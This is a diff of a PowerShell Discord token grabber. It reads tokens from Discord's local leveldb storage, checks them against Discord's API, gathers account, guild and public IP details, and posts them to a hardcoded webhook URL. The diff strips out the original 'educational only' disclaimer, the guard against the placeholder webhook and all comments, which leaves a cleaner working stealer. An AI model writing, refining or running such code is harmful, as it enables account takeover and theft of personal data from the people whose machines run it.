@@ -1,8 +1,7 @@
-# DiscordTokenGrabber.ps1
-# This script is for educational purposes only to teach beginners PowerShell
-# Warning: Use this code only in test environments. Do NOT use it for real data extraction.
 
-# Function to check if a module is installed
+
+# باقي السكربت (نفس الكود السابق)
+
 function Install-ModuleIfNeeded {
     param($ModuleName)
     if (-not (Get-Module -ListAvailable -Name $ModuleName)) {
@@ -11,21 +10,17 @@ function Install-ModuleIfNeeded {
     }
 }
 
-# Check for required security module
 Install-ModuleIfNeeded -ModuleName "Microsoft.PowerShell.Security"
 
-# Define environment variables
 $LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
 $ROAMING = [System.Environment]::GetEnvironmentVariable("APPDATA")
 
-# Define Discord paths (simplified for beginners)
 $PATHS = @{
     "Discord" = "$ROAMING\discord"
     "Discord Canary" = "$ROAMING\discordcanary"
     "Discord PTB" = "$ROAMING\discordptb"
 }
 
-# Function to create HTTP headers
 function Get-Headers {
     param($Token = $null)
     $headers = @{
@@ -38,7 +33,6 @@ function Get-Headers {
     return $headers
 }
 
-# Function to extract tokens (simplified)
 function Get-Tokens {
     param($Path)
     $Path = "$Path\Local Storage\leveldb\"
@@ -54,8 +48,7 @@ function Get-Tokens {
         try {
             $content = Get-Content -Path "$Path\$($file.Name)" -ErrorAction SilentlyContinue
             foreach ($line in $content) {
-                # Regex pattern to find tokens (adjust if needed)
-                $matches = $line | Select-String -Pattern "dQw4w9WgXcQ:[^\s]+" 
+                $matches = $line | Select-String -Pattern "dQw4w9WgXcQ:[^\s]+"
                 if ($matches) {
                     foreach ($match in $matches.Matches) {
                         $token = $match.Value -replace "dQw4w9WgXcQ:", ""
@@ -70,7 +63,6 @@ function Get-Tokens {
     return $tokens
 }
 
-# Function to get public IP address
 function Get-IP {
     try {
         $response = Invoke-WebRequest -Uri "https://api.ipify.org?format=json" -ErrorAction Stop
@@ -81,15 +73,8 @@ function Get-IP {
     }
 }
 
-# Main function
 function Main {
-    # Set your Discord webhook URL here
-    $webhookUrl = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"  # Replace with a valid Discord webhook URL
-# Remove or comment this check if you want to keep this webhook URL
-# if ($webhookUrl -eq "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7") {
-#     Write-Host "Error: You must replace ... " -ForegroundColor Red
-#     exit
-# }
+    $webhookUrl = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"
 
     $checkedTokens = @()
 
@@ -109,7 +94,6 @@ function Main {
             $checkedTokens += $token
 
             try {
-                # Verify token validity
                 $headers = Get-Headers -Token $token
                 $userResponse = Invoke-WebRequest -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -ErrorAction Stop
                 if ($userResponse.StatusCode -ne 200) {
@@ -118,12 +102,10 @@ function Main {
                 }
                 $userData = $userResponse.Content | ConvertFrom-Json
 
-                # Get guilds info (simplified)
                 $guildResponse = Invoke-WebRequest -Uri "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true" -Headers $headers -ErrorAction Stop
                 $guilds = $guildResponse.Content | ConvertFrom-Json
                 $guildCount = $guilds.Count
 
-                # Prepare embed message for webhook
                 $embed = @{
                     embeds = @(
                         @{
@@ -149,7 +131,6 @@ $token
                     avatar_url = "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
 
-                # Send to Discord webhook
                 Invoke-WebRequest -Uri $webhookUrl -Method Post -Body ($embed | ConvertTo-Json -Depth 10) -Headers (Get-Headers) -ErrorAction Stop
 
                 Write-Host "Successfully sent user data for $($userData.username)." -ForegroundColor Green
@@ -161,5 +142,4 @@ $token
     }
 }
 
-# Run the main function
 Main
